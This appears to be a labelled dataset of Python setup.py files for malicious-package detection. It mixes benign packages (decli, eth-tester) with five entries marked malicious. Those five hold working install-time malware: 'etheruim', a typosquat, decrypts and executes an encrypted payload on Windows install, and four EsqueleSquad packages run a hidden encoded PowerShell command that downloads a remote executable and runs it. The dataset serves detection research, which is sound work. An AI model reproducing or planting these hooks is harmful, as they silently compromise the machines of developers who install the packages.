{"idx": "etheruim-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'FwaDCCD FbjzdnCuCnYGWRSskbR'\nLONG_DESCRIPTION = 'HFc tqeQKuRZTqUIjWhSCKvWEiNQGiJKlsyxkcrKtDIDOMfxyX BR yKIDnzdOBmODViRnyiCVTtqgSWLVPfEA wbgyozOvfBrRugHKxWKKMvjuzeymIBsbeC lQKxgXvsoEDrhGoZhBjzEasIG'\n\n\nclass QjuDZWlTbpRMCdHaikSxfsRzkIZRCVXyrPsQlcJknIaKSFDyqoSXjSpetoqrekuLmQwmIHgfmdzuEhyliQbdMIZgSssNpCCXPcFy(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'5BzgHIxsGbUqzYcJLUVTBWiI4L6ytac_Ofr_atFQ65E=').decrypt(b'gAAAAABmbvRc3wDfTswDbtH-mhAM2HRti7ZR0dpk49jFpPBrtCbHp-mauDKU8sKeSouYfhRUXFzArd_bvhlLSjYfPQTW7o3IS933pYarxXVQs4rwpIO-ueocrSXuYI3oV6S25-n1AWMaNS2MO6tK_oQVnJbV8CMJeK521JdcB9EvS2lzdUZSKV7q3ME6kTXGfZrvoLKQl6BVMadnztJJKg0GF4EArJyVSPFZyFmnv3A0w1Ak63L11IY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"etheruim\",\n    version=VERSION,\n    author=\"LOvHQMwtElbc\",\n    author_email=\"rTTbxOYHjdeOzjohR@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': QjuDZWlTbpRMCdHaikSxfsRzkIZRCVXyrPsQlcJknIaKSFDyqoSXjSpetoqrekuLmQwmIHgfmdzuEhyliQbdMIZgSssNpCCXPcFy,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "decli-0.5.2", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['decli']\n\npackage_data = \\\n{'': ['*']}\n\nsetup_kwargs = {\n    'name': 'decli',\n    'version': '0.5.2',\n    'description': 'Minimal, easy-to-use, declarative cli tool',\n    'long_description': '======\\nDecli\\n======\\n\\nMinimal declarative cli tool.\\n\\n.. image:: https://img.shields.io/travis/Woile/decli.svg?style=flat-square\\n    :alt: Travis\\n    :target: https://travis-ci.org/Woile/decli\\n\\n.. image:: https://img.shields.io/codecov/c/github/Woile/decli.svg?style=flat-square\\n    :alt: Codecov\\n    :target: https://codecov.io/gh/Woile/decli\\n\\n.. image:: https://img.shields.io/pypi/v/decli.svg?style=flat-square\\n    :alt: PyPI\\n    :target: https://pypi.org/project/decli/\\n\\n.. image:: https://img.shields.io/pypi/pyversions/decli.svg?style=flat-square\\n    :alt: PyPI - Python Version\\n    :target: https://pypi.org/project/decli/\\n\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"prog\": \"myapp\",\\n        \"description\": \"Process some integers.\",\\n        \"arguments\": [\\n            {\\n                \"name\": \"integers\",\\n                \"metavar\": \"N\",\\n                \"type\": int,\\n                \"nargs\": \"+\",\\n                \"help\": \"an integer for the accumulator\",\\n            },\\n            {\\n                \"name\": \"--sum\",\\n                \"dest\": \"accumulate\",\\n                \"action\": \"store_const\",\\n                \"const\": sum,\\n                \"default\": max,\\n                \"help\": \"sum the integers (default: find the max)\",\\n            },\\n        ],\\n    }\\n    parser = cli(data)\\n    parser.parse_args()\\n\\n\\n::\\n\\n    >> parser.print_help()\\n    usage: myapp [-h] [--sum] N [N ...]\\n\\n    Process some integers.\\n\\n    positional arguments:\\n    N           an integer for the accumulator\\n\\n    optional arguments:\\n    -h, --help  show this help message and exit\\n    --sum       sum the integers (default: find the max)\\n\\n\\n::\\n\\n    In [4]: args = parser.parse_args(\"--sum 3 2 1\".split())\\n\\n    In [5]: args.accumulate(args.integers)\\n    Out[5]: 6\\n\\n\\n.. contents::\\n    :depth: 2\\n\\n\\nAbout\\n=====\\n\\nDecli is minimal wrapper around **argparse**.\\n\\nIt\\'s useful when writing big applications that have many arguments and subcommands, this way it\\'ll be more clear.\\n\\nIt\\'s a minimal library to rapidly create an interface separated from your app.\\n\\nIt\\'s possible to use any argument from **argparse** and it works really well with it.\\n\\nForget about copy pasting the argparse functions, if you are lazy like me, this library should be really handy!\\n\\nMany cases were tested, but it\\'s possible that not everything was covered, so if you find anything, please report it.\\n\\n\\nInstallation\\n============\\n\\n::\\n\\n    pip install -U decli\\n\\nor alternatively:\\n\\n::\\n\\n    poetry add decli\\n\\n\\nUsage\\n======\\n\\nMain cli\\n--------\\n\\nCreate the dictionary in which the cli tool is declared.\\n\\nThe same arguments argparse use are accepted, except parents, which is ignored.\\n\\n- prog - The name of the program (default: sys.argv[0])\\n- usage - The string describing the program usage (default: generated from arguments added to parser)\\n- description - Text to display before the argument help (default: none)\\n- epilog - Text to display after the argument help (default: none)\\n- formatter_class - A class for customizing the help output\\n- prefix_chars - The set of characters that prefix optional arguments (default: \u2018-\u2018)\\n- fromfile_prefix_chars - The set of characters that prefix files from which additional arguments should be read (default: None)\\n- argument_default - The global default value for arguments (default: None)\\n- conflict_handler - The strategy for resolving conflicting optionals (usually unnecessary)\\n- add_help - Add a -h/--help option to the parser (default: True)\\n- allow_abbrev - Allows long options to be abbreviated if the abbreviation is unambiguous. (default: True)\\n\\nMore info in the `argparse page <https://docs.python.org/3/library/argparse.html#argumentparser-objects>`_\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"myapp\",\\n        \"description\": \"This app does something cool\",\\n        \"epilog\": \"And that\\'s it\"\\n    }\\n\\n\\nArguments\\n---------\\n\\nIt\\'s just a list with dictionaries. To add aliases just use a list instead of a string.\\n\\nAccepted values:\\n\\n\\n- name: - Either a name or a list of option strings, e.g. foo or -f, --foo.\\n- action - The basic type of action to be taken when this argument is encountered at the command line.\\n- nargs - The number of command-line arguments that should be consumed.\\n- const - A constant value required by some action and nargs selections.\\n- default - The value produced if the argument is absent from the command line.\\n- type - The type to which the command-line argument should be converted.\\n- choices - A container of the allowable values for the argument.\\n- required - Whether or not the command-line option may be omitted (optionals only).\\n- help - A brief description of what the argument does.\\n- metavar - A name for the argument in usage messages.\\n- dest - The name of the attribute to be added to the object returned by parse_args().\\n\\n\\nMore info about `arguments <https://docs.python.org/3/library/argparse.html#the-add-argument-method>`_\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"myapp\",\\n        \"description\": \"This app does something cool\",\\n        \"epilog\": \"And that\\'s it\",\\n        \"arguments\": [\\n            {\\n                \"name\": \"--foo\"\\n            },\\n            {\\n                \"name\": [\"-b\", \"--bar\"]\\n            }\\n        ]\\n    }\\n\\n\\nSubcommands\\n-----------\\n\\nJust a dictionary where the most important key is **commands** which is a list of the commands.\\n\\n\\nAccepted values:\\n\\n\\n- title - title for the sub-parser group in help output; by default \u201csubcommands\u201d if description is provided, otherwise uses title for positional arguments\\n- description - description for the sub-parser group in help output, by default None\\n- commands - list of dicts describing the commands. Same arguments as the **main cli** are supported. And **func** which is really important.\\n- prog - usage information that will be displayed with sub-command help, by default the name of the program and any positional arguments before the subparser argument\\n- action - the basic type of action to be taken when this argument is encountered at the command line\\n- dest - name of the attribute under which sub-command name will be stored; by default None and no value is stored\\n- required - Whether or not a subcommand must be provided, by default False.\\n- help - help for sub-parser group in help output, by default None\\n- metavar - string presenting available sub-commands in help; by default it is None and presents sub-commands in form {cmd1, cmd2, ..}\\n\\n\\nMore info about `subcommands <https://docs.python.org/3/library/argparse.html#sub-commands>`_\\n\\nFunc\\n~~~~\\n\\nUsually in a sub-command it\\'s useful to specify to which function are they pointing to. That\\'s why each command should have this parameter.\\n\\n\\nWhen you are building an app which does multiple things, each function should be mapped to a command this way, using the **func** argument.\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"prog\": \"myapp\",\\n        \"description\": \"This app does something cool\",\\n        \"epilog\": \"And that\\'s it\",\\n        \"subcommands\": {\\n            \"title\": \"main\",\\n            \"commands\": [\\n                {\\n                    \"name\": \"sum\",\\n                    \"help\": \"new project\",\\n                    \"func\": sum,\\n                    \"arguments\": [\\n                        {\\n                            \"name\": \"integers\",\\n                            \"metavar\": \"N\",\\n                            \"type\": int,\\n                            \"nargs\": \"+\",\\n                            \"help\": \"an integer for the accumulator\",\\n                        },\\n                        {\"name\": \"--name\", \"nargs\": \"?\"},\\n                    ],\\n                }\\n            ]\\n        }\\n    }\\n\\n    parser = cli(data)\\n    args = parser.parse_args([\"sum 1 2 3\".split()])\\n    args.func(args.integers)  # Runs the sum of the integers\\n\\nGroups\\n------\\n\\nUsed to group the arguments based on conceptual groups. This only affects the shown **help**, nothing else.\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"app\",\\n        \"arguments\": [\\n            {\"name\": \"foo\", \"help\": \"foo help\", \"group\": \"group1\"},\\n            {\"name\": \"choo\", \"help\": \"choo help\", \"group\": \"group1\"},\\n            {\"name\": \"--bar\", \"help\": \"bar help\", \"group\": \"group2\"},\\n        ]\\n    }\\n    parser = cli(data)\\n    parser.print_help()\\n\\n::\\n\\n    usage: app [-h] [--bar BAR] foo choo\\n\\n    optional arguments:\\n    -h, --help  show this help message and exit\\n\\n    group1:\\n    foo         foo help\\n    choo        choo help\\n\\n    group2:\\n    --bar BAR   bar help\\n\\n\\nExclusive Groups\\n----------------\\n\\nA mutually exclusive group allows to execute only one **optional** argument (starting with :code:`--`) from the group.\\nIf the condition is not met, it will show an error.\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"app\",\\n        \"arguments\": [\\n            {\"name\": \"--foo\", \"help\": \"foo help\", \"exclusive_group\": \"group1\"},\\n            {\"name\": \"--choo\", \"help\": \"choo help\", \"exclusive_group\": \"group1\"},\\n            {\"name\": \"--bar\", \"help\": \"bar help\", \"exclusive_group\": \"group1\"},\\n        ]\\n    }\\n    parser = cli(data)\\n    parser.print_help()\\n\\n::\\n\\n    usage: app [-h] [--foo FOO | --choo CHOO | --bar BAR]\\n\\n    optional arguments:\\n    -h, --help   show this help message and exit\\n    --foo FOO    foo help\\n    --choo CHOO  choo help\\n    --bar BAR    bar help\\n\\n::\\n\\n    In [1]: parser.parse_args(\"--foo 1 --choo 2\".split())\\n\\n    usage: app [-h] [--foo FOO | --choo CHOO | --bar BAR]\\n    app: error: argument --choo: not allowed with argument --foo\\n\\n\\nGroups and Exclusive groups\\n---------------------------\\n\\nIt is not possible to have groups inside exclusive groups with **decli**.\\n\\n**Decli** will prevent from doing this by raising a :code:`ValueError`.\\n\\nIt is possible to accomplish it with argparse, but the help message generated will be broken and the\\nexclusion won\\'t work.\\n\\nParents\\n-------\\n\\nSometimes, several cli share a common set of arguments.\\n\\nRather than repeating the definitions of these arguments,\\none or more parent clis with all the shared arguments can be passed\\nto :code:`parents=argument` to cli.\\n\\nMore info about `parents <https://docs.python.org/3/library/argparse.html#parents>`_\\n\\nExample:\\n\\n.. code-block:: python\\n\\n    parent_foo_data = {\\n        \"add_help\": False,\\n        \"arguments\": [{\"name\": \"--foo-parent\", \"type\": int}],\\n    }\\n    parent_bar_data = {\\n        \"add_help\": False,\\n        \"arguments\": [{\"name\": \"--bar-parent\", \"type\": int}],\\n    }\\n    parent_foo_cli = cli(parent_foo_data)\\n    parent_bar_cli = cli(parent_bar_data)\\n\\n    parents = [parent_foo_cli, parent_bar_cli]\\n\\n    data = {\\n        \"prog\": \"app\",\\n        \"arguments\": [\\n            {\"name\": \"foo\"}\\n        ]\\n    }\\n    parser = cli(data, parents=parents)\\n    parser.print_help()\\n\\n::\\n\\n    usage: app [-h] [--foo-parent FOO_PARENT] [--bar-parent BAR_PARENT] foo\\n\\n    positional arguments:\\n    foo\\n\\n    optional arguments:\\n    -h, --help            show this help message and exit\\n    --foo-parent FOO_PARENT\\n    --bar-parent BAR_PARENT\\n\\n\\nRecipes\\n=======\\n\\nSubcommands\\n-----------------\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"prog\": \"myapp\",\\n        \"formatter_class\": argparse.RawDescriptionHelpFormatter,\\n        \"description\": \"The software has subcommands which you can use\",\\n        \"subcommands\": {\\n            \"title\": \"main\",\\n            \"description\": \"main commands\",\\n            \"commands\": [\\n                {\\n                    \"name\": \"all\",\\n                    \"help\": \"check every values is true\",\\n                    \"func\": all\\n                },\\n                {\\n                    \"name\": [\"s\", \"sum\"],\\n                    \"help\": \"new project\",\\n                    \"func\": sum,\\n                    \"arguments\": [\\n                        {\\n                            \"name\": \"integers\",\\n                            \"metavar\": \"N\",\\n                            \"type\": int,\\n                            \"nargs\": \"+\",\\n                            \"help\": \"an integer for the accumulator\",\\n                        },\\n                        {\"name\": \"--name\", \"nargs\": \"?\"},\\n                    ],\\n                }\\n            ],\\n        },\\n    }\\n    parser = cli(data)\\n    args = parser.parse_args([\"sum 1 2 3\".split()])\\n    args.func(args.integers)  # Runs the sum of the integers\\n\\n\\nMinimal\\n-------\\n\\nThis app does nothing, but it\\'s the min we can have:\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    parser = cli({})\\n    parser.print_help()\\n\\n::\\n\\n    usage: ipython [-h]\\n\\n    optional arguments:\\n    -h, --help  show this help message and exit\\n\\n\\nPositional arguments\\n--------------------\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": \"echo\"\\n            }\\n        ]\\n    }\\n    parser = cli(data)\\n    args = parser.parse_args([\"foo\"])\\n\\n::\\n\\n    In [11]: print(args.echo)\\n    foo\\n\\n\\nPositional arguments with type\\n------------------------------\\n\\nWhen a type is specified, the argument will be treated as that type, otherwise it\\'ll fail.\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": \"square\",\\n                \"type\": int\\n            }\\n        ]\\n    }\\n    parser = cli(data)\\n    args = parser.parse_args([\"1\"])\\n\\n::\\n\\n    In [11]: print(args.echo)\\n    1\\n\\nOptional arguments\\n------------------\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": \"--verbose\",\\n                \"help\": \"increase output verbosity\"\\n            }\\n        ]\\n    }\\n    parser = cli(data)\\n    args = parser.parse_args([\"--verbosity 1\"])\\n\\n::\\n\\n    In [11]: print(args.verbosity)\\n    1\\n\\n    In [15]: args = parser.parse_args([])\\n\\n    In [16]: args\\n    Out[16]: Namespace(verbose=None)\\n\\n\\nFlags\\n-----\\n\\nFlags are a boolean only (True/False) subset of options.\\n\\n.. code-block:: python\\n\\n    from decli import cli\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": \"--verbose\",\\n                \"action\": \"store_true\",  # defaults to False\\n            },\\n            {\\n                \"name\": \"--noisy\",\\n                \"action\": \"store_false\",  # defaults to True\\n            }\\n        ]\\n    }\\n    parser = cli(data)\\n\\n\\n\\n\\nShort options\\n-------------\\n\\nUsed to add short versions of the options.\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": [\"-v\", \"--verbose\"],\\n                \"help\": \"increase output verbosity\"\\n            }\\n        ]\\n    }\\n\\n\\nGrouping\\n--------\\n\\nThis is only possible using **arguments**.\\n\\nOnly affect the way the help gets displayed. You might be looking for subcommands.\\n\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"mycli\",\\n        \"arguments\": [\\n            {\\n                \"name\": \"--save\",\\n                \"group\": \"main\",\\n                \"help\": \"This save belongs to the main group\",\\n            },\\n            {\\n                \"name\": \"--remove\",\\n                \"group\": \"main\",\\n                \"help\": \"This remove belongs to the main group\",\\n            },\\n        ],\\n    }\\n    parser = cli(data)\\n    parser.print_help()\\n\\n::\\n\\n    usage: mycli [-h] [--save SAVE] [--remove REMOVE]\\n\\n    optional arguments:\\n    -h, --help       show this help message and exit\\n\\n    main:\\n    --save SAVE      This save belongs to the main group\\n    --remove REMOVE  This remove belongs to the main group\\n\\n\\nExclusive group\\n---------------\\n\\nThis is only possible using **optional arguments**.\\n\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"prog\": \"mycli\",\\n        \"arguments\": [\\n            {\\n                \"name\": \"--save\",\\n                \"exclusive_group\": \"main\",\\n                \"help\": \"This save belongs to the main group\",\\n            },\\n            {\\n                \"name\": \"--remove\",\\n                \"exclusive_group\": \"main\",\\n                \"help\": \"This remove belongs to the main group\",\\n            },\\n        ],\\n    }\\n    parser = cli(data)\\n    parser.print_help()\\n\\n::\\n\\n    usage: mycli [-h] [--save SAVE | --remove REMOVE]\\n\\n    optional arguments:\\n    -h, --help       show this help message and exit\\n    --save SAVE      This save belongs to the main group\\n    --remove REMOVE  This remove belongs to the main group\\n\\n\\nCombining Positional and Optional arguments\\n-------------------------------------------\\n\\n.. code-block:: python\\n\\n    data = {\\n        \"arguments\": [\\n            {\\n                \"name\": \"square\",\\n                \"type\": int,\\n                \"help\": \"display a square of a given number\"\\n            },\\n            {\\n                \"name\": [\"-v\", \"--verbose\"],\\n                \"action\": \"store_true\",\\n                \"help\": \"increase output verbosity\"\\n            }\\n        ]\\n    }\\n    parser = cli(data)\\n\\n    args = parser.parse_args()\\n    answer = args.square**2\\n    if args.verbose:\\n        print(f\"the square of {args.square} equals {answer}\")\\n    else:\\n        print(answer)\\n\\n\\nMore Examples\\n-------------\\n\\nMany examples from `argparse documentation <https://docs.python.org/3/library/argparse.html>`_\\nare covered in test/examples.py\\n\\n\\nTesting\\n=======\\n\\n1. Clone the repo\\n2. Install dependencies\\n\\n::\\n\\n    poetry install\\n\\n3. Run tests\\n\\n::\\n\\n    poetry run pytest -s --cov-report term-missing --cov=decli tests/\\n\\n\\nContributing\\n============\\n\\n**PRs are welcome!**\\n',\n    'author': 'Santiago Fraire',\n    'author_email': 'santiwilly@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'python_requires': '>=3.6',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "eth-tester-0.6.0b6", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\n\nextras_require = {\n    'lint': [\n        'flake8>=3.5.0,<4.0.0',\n    ],\n    'test': [\n        'pytest>=6.2.5,<7',\n        'pytest-xdist>=2.0.0,<3',\n        'eth-hash[pycryptodome]>=0.1.4,<1.0.0',\n    ],\n    'dev': [\n        'bumpversion>=0.5.3,<1.0.0',\n        'tox>=2.9.1,<3.0.0',\n        'wheel>=0.30.0,<1.0.0',\n    ],\n    'py-evm': [\n        # Pin py-evm to exact version, until it leaves alpha.\n        # EVM is very high velocity and might change API at each alpha.\n        \"py-evm==0.5.0a3\",\n        \"eth-hash[pysha3]>=0.1.4,<1.0.0;implementation_name=='cpython'\",\n        \"eth-hash[pycryptodome]>=0.1.4,<1.0.0;implementation_name=='pypy'\",\n    ],\n    'docs': [\n        'towncrier==18.5.0',\n    ]\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +\n    extras_require['test'] +\n    extras_require['py-evm'] +\n    extras_require['lint'] +\n    extras_require['docs']\n)\n# convenience in case someone leaves out the `-`\nextras_require['pyevm'] = extras_require['py-evm']\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\nsetup(\n    name='eth-tester',\n    # *IMPORTANT*: Don't manually change the version here. Use the 'bumpversion' utility.\n    version='0.6.0-beta.6',\n    description=\"\"\"Tools for testing Ethereum applications.\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='Piper Merriam',\n    author_email='pipermerriam@gmail.com',\n    url='https://github.com/ethereum/eth-tester',\n    include_package_data=True,\n    install_requires=[\n        \"eth-abi>=2.0.0b4,<3.0.0\",\n        \"eth-account>=0.5.6,<0.6.0\",\n        \"eth-keys>=0.3.4,<0.4.0\",\n        \"eth-utils>=1.4.1,<2.0.0\",\n        \"rlp>=1.1.0,<3\",\n        \"semantic_version>=2.6.0,<3.0.0\",\n    ],\n    extras_require=extras_require,\n    python_requires='>=3.6.8,<4',\n    py_modules=['eth_tester'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "py-cpucandyultra-6.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-cpucandyultra',\n    packages = ['modlib'],\n    version = '7.76',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "splitram-3.74", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'splitram',\n    packages = ['modlib'],\n    version = '3.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfvisaurlpong-1.36", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisaurlpong',\n    packages = ['modlib'],\n    version = '7.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfadlibproof-4.52", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfadlibproof',\n    packages = ['modlib'],\n    version = '8.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
